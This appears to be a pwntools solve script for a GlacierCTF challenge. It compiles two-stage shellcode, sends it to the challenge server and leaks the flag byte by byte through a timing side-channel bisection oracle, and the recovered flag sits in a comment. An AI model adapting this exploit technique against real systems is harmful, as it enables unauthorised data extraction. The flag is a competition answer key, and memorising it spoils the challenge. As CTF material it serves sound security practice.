#!/usr/bin/env python3
from pwn import *


def connect():
    if args.GDB:
        return gdb.debug(["./vuln"], api=True)
    if args.LOCAL:
        return process(["./vuln"])
    else:
        return remote("chall.glacierctf.com", 13383)


def oracle(idx, op, val):
    subprocess.check_call(["make", "clean"])
    subprocess.check_call(["make", "fmt"])
    subprocess.check_call(
        [
            "make",
            "all",
            f"EXTRA_CFLAGS=-DIDX={idx} -DOP='{op}' -DVAL={val}",
        ]
    )
    with open("stage1.bin", "rb") as fp:
        stage1 = fp.read()
    with open("stage2.bin", "rb") as fp:
        stage2 = fp.read()
    assert len(stage1) <= 123
    assert b"\x0a" not in stage1
    assert len(stage2) <= 1000
    with connect() as tube:
        tube.send(stage1 + b"\x0a" + stage2)
        t0 = time.time()
        tube.recvall(timeout=1)
        dt = time.time() - t0
        result = dt < 0.9
        print(f"[{idx}] {op} {val}: {result} ({dt})")
        return result


def bisect(idx):
    left = 0
    right = 255
    while left <= right:
        middle = (left + right) // 2
        if oracle(idx, "<", middle):
            right = middle - 1
        elif oracle(idx, ">", middle):
            left = middle + 1
        else:
            return middle
    raise RuntimeError()


def main():
    flag = ""
    for i, c in enumerate(flag):
        assert oracle(i, "==", ord(c))
    i = len(flag)
    while True:
        flag += chr(bisect(i))
        print(f"{flag=}")
        i += 1
    # gctf{W41t_d1D_yoU_R3aLlY_r3Bu1Ld_L$?}


if __name__ == "__main__":
    main()
